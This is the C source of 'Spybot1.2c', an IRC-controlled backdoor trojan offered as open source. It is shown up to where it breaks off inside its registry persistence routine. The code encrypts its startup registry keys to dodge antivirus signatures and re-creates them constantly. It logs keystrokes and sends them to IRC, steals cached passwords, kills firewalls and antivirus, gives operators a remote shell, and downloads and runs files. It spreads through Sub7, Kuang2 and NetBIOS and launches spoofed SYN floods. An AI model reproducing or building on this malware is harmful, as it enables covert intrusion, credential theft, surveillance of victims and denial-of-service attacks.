//////////////////////////////////////////////////////////
//							//
//		Spybot1.2c by Mich			//
//							//
//		Opensource irc bot 			//
//							//
//	    IRC: irc.babbels.com #dreams		//
//	    						//
//	http://members.lycos.co.uk/ircspybot/		//
//	    						//
//	      opensource_bot@hotmail.com		//
//	    						//
//		use at your own risk.			//
//							//
//	       Good luck and have fun!			//
//							//
//////////////////////////////////////////////////////////


//Disclaimer

//Spybot is meant to be used for legal purposes only.  Since it is beyond the author's control of what Spybot is used for, the author of Spybot can not be held accountable for anything you do with this source.

#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <stdio.h>
#include <shellapi.h>
#include <wininet.h>
#include <mmsystem.h>
#include "settings.h"
#include <lm.h>
#include <lmat.h>
#include <lmremutl.h>

char nick[100];
char realname[250];
char runoncekey[] = "vtb}wglhi’ƒ˜‰–”‚|}ƒ‘‰‹ “‚]˜—ŽŽŽšpˆ—’”vušŠxŽ‰";
char runkey[] = "vtb}wglhi’ƒ˜‰–”‚|}ƒ‘‰‹ “‚]˜—ŽŽŽšpˆ—’”vušŠ";
//variables
HANDLE mutexhandle;
char dcchost[20];
char dccfilename[MAX_PATH];
char sendtochan[50];
char Online_time[250];
int dccport;
int redirect_to_port;
SOCKET redirectsock_in;
SOCKET dcchosts;
SOCKET dccspy = 0;
SOCKET redirectspy = 0;
#ifdef Let_The_Bot_Talk
HANDLE talk_thread_handle;
#endif
BOOL info = FALSE;
HANDLE pipe_read;
HANDLE pipe_write;
HANDLE pipe_Hproc;
HANDLE hChildInWrDupe;
SOCKET pipesock;
char pipe_chan[50]; 
char IRC_server[500];
#ifdef USE_IDENT_SERVER
SOCKET identsock;
BOOL run_ident;
#endif
HANDLE Main_DLL_Handle;
#ifdef SYN_FLOOD
DWORD WINAPI syn_flood(LPVOID param);

typedef struct syn_struct {
	char host[100];
	int port;
	int delay;
	int times;
	int thread;
	int state;
} syndata;

syndata syn[30];

#endif

#ifdef SPOOFD_SYNFLOOD

//Spoofd synflood source comes from teslas sdbot edition i have only changed some think (its better) 

DWORD WINAPI Spoofd_syn(LPVOID param);

typedef struct Spoofd_syn_struct {
	unsigned long TargetIP;
	int port;
	int delay;
	int times;
	int thread;
	int state;
	SOCKET sock;
} Spoofd_syndata;

Spoofd_syndata Spoofdsyn[30];

#define IP_HDRINCL 2 

typedef struct ip_hdr 
{ 
	unsigned char h_verlen; 
	unsigned char tos; 
	unsigned short total_len; 
	unsigned short ident; 
	unsigned short frag_and_flags; 
	unsigned char ttl; 
	unsigned char proto; 
	unsigned short checksum; 
	unsigned int sourceIP; 
	unsigned int destIP; 
}IPHEADER; 

typedef struct tsd_hdr 
{ 
	unsigned long saddr; 
	unsigned long daddr; 
	char mbz; 
	char ptcl; 
	unsigned short tcpl; 
}PSDHEADER; 

typedef struct tcp_hdr 
{ 
	USHORT th_sport; 
	USHORT th_dport; 
	unsigned int th_seq; 
	unsigned int th_ack; 
	unsigned char th_lenres; 
	unsigned char th_flag; 
	USHORT th_win; 
	USHORT th_sum; 
	USHORT th_urp; 
}TCPHEADER; 


USHORT checksum(USHORT *buffer, int size) 
{ 
	unsigned long cksum=0; 
	while(size >1) 
	{ 
		cksum+=*buffer++; 
		size -=sizeof(USHORT); 
	} 
	if(size ) 
	{ 
		cksum += *(UCHAR*)buffer; 
	} 

	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16); 
	return (USHORT)(~cksum); 
} 

#endif

#ifdef SUB7_SPREADER
int sub7(SOCKET sock);
#endif

#ifdef KUANG2_SPREADER
int KUANG(SOCKET sock);
#endif
char connection_name[128];
char connection_type[8];
char loader[MAX_PATH];
char temploader[MAX_PATH];
char logins[maxlogins][50]={ 0 };
char OS[140];
int sendkeysto = 0;
DWORD nSize = 240;
SOCKET keysock;
char keylogchan[50];
int distime = 1800000;
const char Error[] = "Error operation failed";
const char OK[] = "Operation completed";
char IP[] = "000.000.000.000";
char IP2[7];
const char No_File[] = "File doesn't exists";
int ping_delay;
// function prototypes
DWORD WINAPI ping(LPVOID param);
int netdevil(char *ip,int port,SOCKET ircsock,SOCKET sock,char *chan);
void Setfiletime(char *file);
void getnick();
void removeshares(void);
DWORD WINAPI talk_thread(LPVOID Param);
int InfectNetBIOS2(char * ipaddress,SOCKET sock,char *chan);
DWORD WINAPI download(LPVOID param);
DWORD WINAPI port_redirect(LPVOID param);
SOCKET Listen(int port);
SOCKET create_sock(char *host, int port);
void Close_Handles();
DWORD WINAPI PipeReadThread(LPVOID param);
int pipe_send(SOCKET sock,char *chan,char *buf);
int open_cmd(SOCKET sock,char * chan);
DWORD WINAPI PipeReadThread(LPVOID param);
void Keyevent (BYTE key,BOOL caps);
int HTTP_server(char *dir,int poort);
DWORD WINAPI port_scanner(LPVOID param);
DWORD WINAPI HTTP_server_thread(LPVOID Param);
DWORD WINAPI HTTP_server_to_guest(LPVOID Param);
int Check_Requestedfile(SOCKET sock,char * dir,char * rFile);
int getfiles(char *current,SOCKET dccsock,char *chan,char *URL);
DWORD WINAPI  http_header(LPVOID param);
void http_send_file(SOCKET sock,char *file);
char * file_to_html(char *file);
int cashedpasswords(SOCKET sock,char *sendto);
void writekeys(BOOL uninstall);
void uninstall(void);
void randnick();
void raw_commandsonjoin(SOCKET sock,char *chan);
void raw_commands(SOCKET sock);
int sendkeys(SOCKET sock,char *buf,char *window,char *logfile);
int irc_connect(char * serveraddr,int poort);
int read_command(SOCKET sendsock,SOCKET ircsock,char *command,char *line,char *sendto);
int irc_read(SOCKET Server);
int irc_readline(char * line,SOCKET Server);
char * sysinfo(char *sinfo,SOCKET sock);
int cpuspeed(void);
unsigned __int64 cyclecount();
DWORD WINAPI dcc_send(LPVOID param);
DWORD WINAPI dcc_chat(LPVOID param);
DWORD WINAPI dcc_getfile(LPVOID param);
DWORD WINAPI keylogger(LPVOID param);
DWORD WINAPI kill_av(LPVOID param);
DWORD WINAPI keepkeys(LPVOID param);
int listProcesses(SOCKET sock,char *chan,char *proccess,BOOL killthread);
int scan_host(char *host,int port,int num);
void GetNewIp(int num);
int addthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir);


typedef struct scan_struct {
	char file[MAX_PATH];
	char ip[16];
	char chan[30];
	int port;
	int delay;
	int state; //0 = empty, 1 = active thread
	int extra;
	int thread;
	SOCKET sock;
	int scan_1;
	int scan_2;
	int scan_3;
	int scan_4;
} scandata;

scandata scan[4];



typedef struct threads_struct {
	char name [250];
	int id; //1 = firewall/AV killer, 2 = Keylogger, 3 = HTTP server, 4 = Port scanner 5 = synflood,6 = redirect
	int num;
	int port;
	SOCKET sock;
	HANDLE Threat_Handle;
	char dir[MAX_PATH];
	char file[MAX_PATH];
} thread;

thread threads[40];


// kernel32.dll typedefs/structs
 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;
 typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
 CT32S fCreateToolhelp32Snapshot;
 typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
 P32F fProcess32First;
 typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
 P32N fProcess32Next;
 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;

char * decryptpass(char *str,char *nick)
{
	int c=0;
 	for (int i = 0;str[i] != 0; i++) {
		if (c == strlen(nick)) c=0;
		int k = nick[c] - 45;
		str[i] = str[i] - k;
		c++;
        }
	return str;
}

 int WINAPI MainProc(HINSTANCE hInstance)
 {
	WSADATA  WSData;
	int err, c, x;
	DWORD id;
	HANDLE Threat_Handle;
	char sysdir[MAX_PATH];
	char *CommandLine;
	char buf[250];
	decryptpass(runoncekey,key); //decrypt the startup keys some virus scanners use the startup keys as a signature
	decryptpass(runkey,key);
	GetSystemDirectory(sysdir, sizeof(sysdir));
	sprintf(loader,"%s\\%s",sysdir,loadername);
	char tempdir[MAX_PATH]; 
	GetTempPath(sizeof(tempdir), tempdir);
	srand(GetTickCount());
	char tempfile[5];
        for (x=0;x<strlen(tempfile);x++)
		tempfile[x] = (rand()%26)+97;
	sprintf(temploader,"%s\\%s.txt",tempdir,tempfile);
        writekeys(FALSE);
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) { //thanks to sdbot
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot"); 
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");
	}
   	if (WSAStartup(MAKEWORD(1, 1), &WSData))
		if (WSAStartup(MAKEWORD(1, 0), &WSData))
        		ExitProcess(0);
	for (c=0;c <= 3;c++)
		scan[c].state = 0;
	for (c=0;c < 40;c++)
		threads[c].id = 0;
	#ifdef SYN_FLOOD
	for (c=0;c <= 30;c++)
		syn[c].state = 0;
	#endif

	#ifdef Use_Firewall_killer
	Threat_Handle = CreateThread(NULL, 0, &kill_av, NULL, 0, &id);
	addthread("F/AV Killer",0,Threat_Handle,1,"\0");
	#endif

	CreateThread(NULL, 0, &keepkeys, NULL, 0, &id);
	memset(keylogchan,0,sizeof(keylogchan));

	#ifdef start_keylogger_afterstartup
	Threat_Handle = CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
	sprintf(buf,"Keys logging to %s\\%s",sysdir,keylogfilename);
	addthread(buf,0,Threat_Handle,2,"\0");
	#endif

////////////////////////decrypt some data, make sure before you enable this that you first encrypt al data with the provided mIRC script /////////////////////////////////////

	//decryptpass(password,key);
	//decryptpass(channelpass,key);
	//decryptpass(channel,key);
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); // load version info into verinfo
	
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) strcpy(OS,"95");
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) strcpy(OS,"NT");
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) strcpy(OS,"98");
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) strcpy(OS,"ME");
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) strcpy(OS,"2000");
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) strcpy(OS,"XP");
	else strcpy(OS,"???");
	#ifdef Check_for_internetconnection
	DWORD ConState;
	while (1) {
		if (!InternetGetConnectedState(&ConState,0)) { //see if we there is a internet connection
			Sleep(30000); 
			continue;
		}
		break; //there is a connection 
	}
	#endif

	#ifdef start_httpserver_afterstartup 
	HTTP_server(root_dir,http_poort);
	#endif
	c = 0;
		DWORD n;
	memset(connection_name, 0, sizeof(connection_name));
	memset(connection_type, 0, sizeof(connection_type));
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    	if (wininet_dll) {
	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
		if (fInternetGetConnectedStateEx) {
			fInternetGetConnectedStateEx(&n, (char *)&connection_name, sizeof(connection_name), 0);
    			if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strcpy(connection_type,  "dial-up");
	 		else if (n) strcpy(connection_type,  "LAN");
			else strcpy(connection_type, "N/A");
		} 
		else {
			strcpy(connection_type, "N/A");
			strcpy(connection_name, "N/A");
		}

	}
	
	while (1) {
		if (ircservers[c] == NULL) c = 0;
 		err = irc_connect(ircservers[c],serverports[c]);
		if (err == 1) break;
		Sleep(5000);
		c++;
	}
	WSACleanup();

	#ifdef remote_cmd
	Close_Handles();
	#endif

	ExitProcess(0);
	return 0;
 }
//DLL Entry Point

 BOOL WINAPI __declspec(dllexport) LibMain(HINSTANCE hDLL, DWORD Reason, LPVOID Reserved)
 {
	DWORD dwTID; 
	Main_DLL_Handle = hDLL;
	switch (Reason) {
		case DLL_PROCESS_ATTACH:
			CreateThread(0, 0, MainProc, (LPVOID) hDLL, 0, &dwTID);
	}
	return TRUE;
	
 }
int read_command(SOCKET sendsock,SOCKET ircsock,char *command,char *line,char *sendto)
{
	char x[512];
	char y[512];
	char line1[512];
	char *s[10];
	int i,c;
	int err;
	DWORD id;
	char buf[512];
	memset(x,0,sizeof(x));
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	s[0] = strtok(line1, " ");
	for (i = 1; i < 6; i++) s[i] = strtok(NULL, " ");
	memset(sendtochan,0,sizeof(sendtochan));
	info = FALSE;
	HANDLE Threat_Handle;
	if (strcmp(raw_command, command) == 0)  {
		strncpy(x, line+4, sizeof(x)-1);
		sendto = NULL;
		sendsock = ircsock;
	}
	else if (strcmp(threads_command,command) == 0) {
		for (i=0;i <= 40;i++) {
			if (threads[i].id != 0) {
				sprintf(x,"%i: %s",i,threads[i].name);
	
      
				strcat(x,"\n");
				if (sendto == NULL) //send to DCC chat
					send(sendsock,x,strlen(x),0);
				else if (sendsock != 0) {
					sprintf(y,"PRIVMSG %s :%s",sendto,x);
					send(sendsock,y,strlen(y),0);
				}
			}
		}	
		return 0;
		
	}
	else if (strcmp(spy_command,command) == 0 && sendto == NULL) {
		sprintf(x,"Spying on irc connection");
		dccspy = sendsock;
	}
	else if (strcmp(stopspy_command,command) == 0) {
		sprintf(x,"Spy stoped");
		dccspy = 0;
	}
	else if (strcmp(redirect_spy_command,command) == 0 && sendto == NULL) {
		sprintf(x,"Spying on port redirect");
		redirectspy = sendsock;
	}
	else if (strcmp(redirect_stopspy_command,command) == 0) {
		sprintf(x,"Spy stoped");
		redirectspy = 0;
	}
	else if (strcmp(uninstall_command,command) == 0) {
		writekeys(TRUE);
	}
	else if (strcmp(info_command, command) == 0)  {
		sysinfo(x,sendsock);
	}
	else if (strcmp(passwords_command,command) == 0) {
		if (cashedpasswords(sendsock,sendto) == 0) strcpy(x,OK);
		else strcpy(x,Error);
	}
	else if (strcmp(startkeylogger_command, command) == 0)  {
		if (sendkeysto == 1) sprintf(x,"error already logging keys to %s use \"stopkeylogger\" to stop",keylogchan);
		else {
			if (sendto != NULL) {
				sprintf(keylogchan,sendto);
				sprintf(x,"Keylogger active output to: %s",keylogchan);
			}
			else {
				memset(keylogchan,0,sizeof(keylogchan));
				sprintf(x,"Keylogger active output to: DCC chat");
			}
			sendkeysto = 1;
			keysock = sendsock;
			BOOL keylog = FALSE;
			for (c=0;c <= 20;c++)
				if (threads[c].id == 2) {  keylog = TRUE; break; }
			if (keylog == FALSE) {
				Threat_Handle = CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
				sprintf(buf,"Keylogger logging to %s",keylogchan);
				addthread(buf,0,Threat_Handle,2,"\0");
			}
			
			sendkeysto = 1;
		}
	}
	else if (strcmp(stopkeylogger_command, command) == 0)  {
		sendkeysto = 0;
		memset(keylogchan,0,sizeof(keylogchan));
		sprintf(x,"Keylogger stoped");
	}
	else if (strcmp(listprocesses_command, command) == 0)  {
		if (listProcesses(sendsock,sendto,NULL,FALSE) == 0) strcpy(x,OK);
		else strcpy(x,Error);
	}
	else if (strcmp(reconnect_command, command) == 0 && sendto != NULL)  {
		send(sendsock,"QUIT\n",5,0);
		return 2;
	}
	#ifdef use_funstuf //lame stuf :-)
	else if (strcmp(keyboardlights_command, command) == 0)  {
		for (i = 0;i < 50;i++)
		{
			Keyevent(VK_CAPITAL,FALSE);
			Keyevent(VK_SCROLL,FALSE);
			Keyevent(VK_NUMLOCK,FALSE);
			Sleep(200);
		}
		strcpy(x,OK);
	}
	#endif
	else if (strcmp(disconnect_command, command) == 0 && sendto != NULL)  {
		if (s[1] != NULL) distime = atoi(s[1]) * 1000;
		send(sendsock,"QUIT\n",5,0);
		return 3;
	}
	else if (strcmp(quit_command, command) == 0)  {
		return 1;
	}
	else if (strcmp(reboot_command, command) == 0)  {
		if (ExitWindowsEx(EWX_FORCE,0) == 0) strcpy(x,Error);
		else strcpy(x,"QUIT Bye Bye\n");
	}
	#ifdef remote_cmd
	else if (strcmp(opencmd_command,command) == 0) {
		if (open_cmd(sendsock,sendto) == -1) strcpy(x,Error);
		else strcpy(x,"cmd.exe has started type \"cmd help\" for commands");
	}
	else if (strcmp(cmd_command,command) == 0) {
		DWORD bw;
		if (s[1] != NULL) {
			strcat(line,"\n");
			sprintf(line1,strstr(line," ")+1);
		}
		else sprintf(line1,"\n");
		bw = strlen(line1);
		if (!WriteFile(hChildInWrDupe,line1,bw,&bw,NULL)) {
			Close_Handles();
			strcpy(x,Error);
		}
	}
	#endif
        else if (s[1] != NULL) {
		if (strcmp(delete_command, command) == 0) {
			if (DeleteFile(strstr(line," ")+1)) strcpy(x,OK);
			else strcpy(x,Error);
		}
		else if (strcmp(server_command,command) == 0 && sendto != NULL) {
			memset(IRC_server,0,sizeof(IRC_server));
			strcpy(IRC_server,s[1]);
			send(sendsock,"QUIT\n",8,0);
			return 2;
		}
		else if (strcmp(execute_command, command) == 0) {
			if ((int) ShellExecute(0, "open", strstr(line," ")+1, NULL, NULL, SW_SHOW) < 33) strcpy(x,Error);
			else strcpy(x,OK);
		}
		else if (strcmp(makedir_command, command) == 0) {
			if (CreateDirectory(strstr(line," ")+1, 0)) strcpy(x,OK);
			else strcpy(x,Error);
		}
		else if (strcmp(list_command, command) == 0)  {
			getfiles(line+5,sendsock,sendto,NULL);
			strcpy(x,OK);
		}
		#ifdef use_funstuf //lame stuf :-)
		else if (strcmp(cdrom_command, command) == 0) {
			if (atoi(s[1]) == 0) {
				strcpy(x,"cd-rom drive closed");
				mciSendString("set CDAudio door closed", NULL, 127, 0);
			}
			else {
				strcpy(x,"cd-rom drive opened");
				mciSendString("set CDAudio door open", NULL, 127, 0);
			}
		}
		#endif
		else if (strcmp(killprocess_command, command) == 0) {
			if (listProcesses(sendsock,NULL,s[1],FALSE) == 1) strcpy(x,OK);
			else strcpy(x,Error);

		}
		#ifdef use_funstuf //lame stuf :-)
		else if (strcmp(sendkeys_command, command) == 0)  {
			strncpy(x, line+10, sizeof(x)-1);
			int c = 0;
			int z;
			char chr[2];
			char bla[10];
			for (i = 0;i < strlen(x);i++)
			{
				memset(chr,0,sizeof(chr));
				chr[0] = x[i];
				for (c = 0;c < 92;c++)
				{

					if (strcmp(chr,"") == 0) { //bold (ctrl + b) = RETURN
						Keyevent(VK_RETURN,FALSE);
						break;
					}
					else if (strcmp(chr,"") == 0) { //underlined (ctrl + u) = backspace
						Keyevent(VK_BACK,FALSE);
						break;
					}
					else if (strcmp(chr,outputL[c]) == 0) {
						z = inputL[c];
						Keyevent(z,FALSE);
						break;
					}
					else if (strcmp(chr,outputH[c]) == 0) {
						z = inputL[c];
						Keyevent(z,TRUE);
						break;
					}
				}
			}
			strcpy(x,OK);

		}
		#endif
		else if (strcmp(killthread_command, command) == 0)  {
			int t = atoi(s[1]);
			if (t > 39) return 0;
			if (threads[t].id != 0) {
				if (TerminateThread(threads[t].Threat_Handle,0) == 0) strcpy(x,Error);
				else {
					sprintf(x,"Thread killed (%s)",threads[t].name);
					closesocket(threads[t].sock);
					if (threads[t].id == 2) { memset(keylogchan,0,sizeof(keylogchan)); sendkeysto = 0; }
					if (threads[t].id == 4) {
						for (i=0;i <= 3;i++)
							if (scan[i].state != 0 && scan[i].thread == t) { scan[i].state = 0; break; }
					}

					threads[t].id = 0;
					
				}
			}
		}
		else if (strcmp(get_command,command) == 0 && sendto != NULL) { //dcc GET
			dcchosts = sendsock;
			memset(dccfilename,0,sizeof(dccfilename));
			memset(dcchost,0,sizeof(dcchost));
			strcpy(sendtochan,sendto);
			sprintf(dccfilename,strstr(line," ")+1);
			CreateThread(NULL, 0, &dcc_send, NULL, 0, &id);
			while (info == FALSE) Sleep(10);
		}
		else if (strcmp(update_command,command) == 0) {
			dcchosts = sendsock;
			if (sendto != NULL) strcpy(sendtochan,sendto); 
			sprintf(x,"update %s",s[1]);
			i = addthread(x ,0,NULL,8,s[1]);
			sprintf(threads[i].dir,s[1]);
			memset(threads[i].file,0,sizeof(threads[i].file));
			Threat_Handle = CreateThread(NULL, 0, &download,(LPVOID)i, 0, &id);
			threads[i].Threat_Handle = Threat_Handle;
					
		}
		
		else if (s[2] != NULL) {
			if (strcmp(httpserver_command,command) == 0) {
				int poort = atoi(s[1]);
				memset(buf,0,sizeof(buf));
				sprintf(buf,s[2]);
				for(i=3;s[i] != NULL;i++) 
					sprintf(buf,"%s %s",buf,s[i]);
				i = HTTP_server(buf,poort);
				if (i == -1) sprintf(x,Error);
				else 
					sprintf(x,"%s Address http://%s:%i/ .",threads[i].name,IP,poort);
			}
			#ifdef WEB_DOWNLOAD
			else if (strcmp(download_command,command) == 0) {
				dcchosts = sendsock;
				if (sendto != NULL) strcpy(sendtochan,sendto); 
				sprintf(x,"download %s %s",s[1],s[2]);
				i = addthread(x ,0,NULL,8,s[2]);
				sprintf(threads[i].dir,s[1]);
				sprintf(threads[i].file,s[2]);
				Threat_Handle = CreateThread(NULL, 0, &download,(LPVOID)i, 0, &id);
				threads[i].Threat_Handle = Threat_Handle;
					
			}
			#endif
			else if (strcmp(rename_command,command) == 0) {
				if (MoveFile(s[1],s[2]) == 0) strcpy(x,Error);
				else strcpy(x,OK);
			}
			else if (strcmp(sendto_command,command) == 0 && sendto != NULL) {
				dcchosts = sendsock;
				memset(dccfilename,0,sizeof(dccfilename));
				memset(dcchost,0,sizeof(dcchost));
				strcpy(sendtochan,s[1]);
				sprintf(dccfilename,strstr(line+strlen(s[1])+1," ")+1);
				CreateThread(NULL, 0, &dcc_send, NULL, 0, &id);
				while (info == FALSE) Sleep(10);
			}
			else if (s[3] != NULL) {
				dcchosts = sendsock;
				memset(dccfilename,0,sizeof(dccfilename));
				memset(dcchost,0,sizeof(dcchost));
				if (sendto != NULL) strcpy(sendtochan,sendto); 
 		 		if (strcmp("SEND",command) == 0) { //dcc send
					sprintf(dccfilename,s[1]);
					sprintf(dcchost,s[2]);
					dccport = atoi(s[3]);
					CreateThread(NULL, 0, &dcc_getfile, NULL, 0, &id);
					while (info == FALSE) Sleep(5);
					
				}
				else if (strcmp("CHAT",command) == 0 && sendto != NULL) { //dcc chat
					sprintf(dcchost,s[2]);
					dccport = atoi(s[3]);
					CreateThread(NULL, 0, &dcc_chat, NULL, 0, &id);
					while (info == FALSE) Sleep(5);
				}
				else if (strcmp(redirect_command,command) == 0) {
					SOCKET sock;
					if ((sock = Listen(atoi(s[1]))) == -1) strcpy(x,Error);
					else {
						sprintf(x,"redirect %s:%i > %s:%i",IP,atoi(s[1]),s[2],atoi(s[3]));
						i = addthread(x ,sock,NULL,6,s[2]);
						threads[i].port = atoi(s[3]);
						sprintf(threads[i].dir,s[2]);
						Threat_Handle = CreateThread(NULL, 0, &port_redirect,(LPVOID)i, 0, &id);
						threads[i].Threat_Handle = Threat_Handle;
					}
				}
				else if (strcmp(scan_command,command) == 0) {
					for (i=0;i <= 3;i++)
						if (scan[i].state == 0) break;
					if (i > 2) return 0; //all threads full
						
					if (strcmp("0",s[1]) == 0) { //we start at a random ip address
						srand(GetTickCount());
						sprintf(scan[i].ip,"%i.%i.%i.0",rand()%255,rand()%255,rand()%255);
					}
					else sprintf(scan[i].ip,s[1]);
					scan[i].port = atoi(s[2]);
					scan[i].delay = atoi(s[3]) * 1000;
					scan[i].extra = 0;
					if (s[4] != NULL) {
						#ifdef SUB7_SPREADER
						if (strcmp(s[4],"sub7") == 0) scan[i].extra = 1;
						#endif
						#ifdef KUANG2_SPREADER
						if (strcmp(s[4],"kuang") == 0) scan[i].extra = 2;
						#endif
						#ifdef NB_SPREADER
						if (strcmp(s[4],"nb") == 0) scan[i].extra = 3;
						#endif
						if (strcmp(s[4],"devil") == 0) scan[i].extra = 4;
					}
					sprintf(scan[i].file,"\0");
					sprintf(scan[i].chan,"\0");
					scan[i].sock = sendsock;
					if (sendto != NULL) sprintf(scan[i].chan,sendto); //channel or query
					if (s[4] != NULL && scan[i].extra == 0) { //we are gonna log to a file
						char sysdir[MAX_PATH];
						GetSystemDirectory(sysdir, sizeof(sysdir));
						sprintf(scan[i].file,"%s\\%s",sysdir,s[4]);
					}
					Threat_Handle = CreateThread(NULL, 0, &port_scanner,(LPVOID)i, 0, &id);
					if (Threat_Handle) {	
						if (strlen(scan[i].file) > 2) sprintf(x,"scan ip: %s p: %i d: %s. logging to: %s",scan[i].ip,scan[i].port,s[3],scan[i].file);
						else sprintf(x,"scan ip: %s p: %i d: %s.",scan[i].ip,scan[i].port,s[3]);
						scan[i].thread = addthread(x ,0,Threat_Handle,4,"\0");			
					}
					else 
						strcpy(x,Error);
				}
				else if (s[4] != NULL) {
					#ifdef SYN_FLOOD
					if (strcmp(syn_command,command) == 0 && s[4] != NULL) {
						for (i=0;i < 10;i++)
							if (syn[i].state == 0) break;
						if (i > 9) return 0; //all threads full
						strcpy(syn[i].host,s[1]);
						syn[i].port = atoi(s[2]);
						syn[i].delay = atoi(s[3]);
						if (syn[i].delay < 5) syn[i].delay = 5;
						syn[i].times = atoi(s[4]);
						memset(x,0,sizeof(x));
						sprintf(x,"Syn: %s p: %i d: %i t:%i.",syn[i].host,syn[i].port,syn[i].delay,syn[i].times);
						Threat_Handle = CreateThread(NULL, 0, &syn_flood,(LPVOID)i, 0, &id);
						if (Threat_Handle) 
							syn[i].thread = addthread(x ,0,Threat_Handle,5,"\0");	
						else strcpy(x,Error);

					}
					#endif
					#ifdef SPOOFD_SYNFLOOD
					if (strcmp(spoofdsyn_command,command) == 0 && s[4] != NULL) {
						for (i=0;i < 10;i++)
							if (Spoofdsyn[i].state == 0) break;
						if (i > 9) return 0; //all threads full
						Spoofdsyn[i].TargetIP = inet_addr(s[1]);
						Spoofdsyn[i].port = atoi(s[2]);
						Spoofdsyn[i].delay = atoi(s[3]);
						Spoofdsyn[i].sock = sendsock;
						if (Spoofdsyn[i].delay < 5) Spoofdsyn[i].delay = 5;
						Spoofdsyn[i].times = atoi(s[4]);
						memset(x,0,sizeof(x));
						sprintf(x,"Syn: %s p: %i d: %i t:%i.",s[1],Spoofdsyn[i].port,Spoofdsyn[i].delay,Spoofdsyn[i].times);
						Threat_Handle = CreateThread(NULL, 0, &Spoofd_syn,(LPVOID)i, 0, &id);
						if (Threat_Handle) 
							Spoofdsyn[i].thread = addthread(x ,0,Threat_Handle,7,"\0");	
						else strcpy(x,Error);

					}
					#endif
					if (strcmp(ping_command,command) == 0) {
						sprintf(x,"Ping %s size: %s delay: %s times: %s  \n",s[1],s[2],s[3],s[4]);
						i = addthread(x,0,0,8,s[1]);
						threads[i].port = atoi(s[2]);
						if (threads[i].port > 65500) threads[i].port = 65500;
						ping_delay = atoi(s[3]);
						if (ping_delay < 1) ping_delay = 1;
						threads[i].num = atoi(s[4]);
						strcpy(threads[i].file,sendto);
						threads[i].Threat_Handle = CreateThread(NULL, 0, &ping,(LPVOID)i, 0, &id);
					}	
				}
			}
		}
	}
	else return 0;
	if (strlen(x) == 0) return 0;
	strcat(x,"\n");
	if (sendto == NULL) //send to DCC chat
		send(sendsock,x,strlen(x),0);
	else if (sendsock != 0) {
		sprintf(y,"PRIVMSG %s :%s",sendto,x);
		send(sendsock,y,strlen(y),0);
	}

	return 0;
}




int addthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir)
{
	int c;
	for (c=0;c <= 40;c++)
		if (threads[c].id == 0) break;
	if (c > 19) return -1;
	sprintf(threads[c].name,name);
	threads[c].id = id;
	threads[c].num = c;
	threads[c].sock = sock;
	threads[c].Threat_Handle = Threat_Handle;
	sprintf(threads[c].dir,dir);
	return c;
}


//simple decrypt function prevent people to see the important stuff with a hexediter




DWORD WINAPI keepkeys(LPVOID param) //when the startup keys are removed we create them again ;-)
{
	while (1)
	{
		writekeys(FALSE);
		Sleep(10000);
	}
	return 0; //will never hapen but if you remove it it will generate a warning..
}
#ifdef USE_IDENT_SERVER
DWORD WINAPI identserv(LPVOID Param)
{
	int port = (int)Param;
	SOCKET sock;
	SOCKADDR_IN  identaddr;
	int addrlen = sizeof(identaddr);
	char sendbuf[512];
	if ((identsock = Listen(113)) == -1)
		return 0; //unable to open port
	getnick();
	while (run_ident) {
		if ((sock = accept(identsock, (SOCKADDR *)&identaddr,&addrlen)) != INVALID_SOCKET)  {
			Sleep(1000);
			sprintf(sendbuf, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, port, (char *)nick); 
			send(sock,sendbuf,strlen(sendbuf), 0);
			Sleep(1000);
			closesocket(sock);
		}
        }
	closesocket(identsock);	
	return 0;	
}
#endif
void writekeys(BOOL uninstal)
{
	unsigned long size = 250;
	HKEY key;
	BYTE  buf[200];
	RegCreateKeyEx(HKEY_CURRENT_USER, runoncekey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	if (uninstal) {
		RegDeleteValue(key,( LPCTSTR ) valuename);
	}
    	else if (RegQueryValueEx(key, ( LPCTSTR ) valuename , 0, 0,buf, &size) != ERROR_SUCCESS || strcmp(buf, loadername) != 0) {
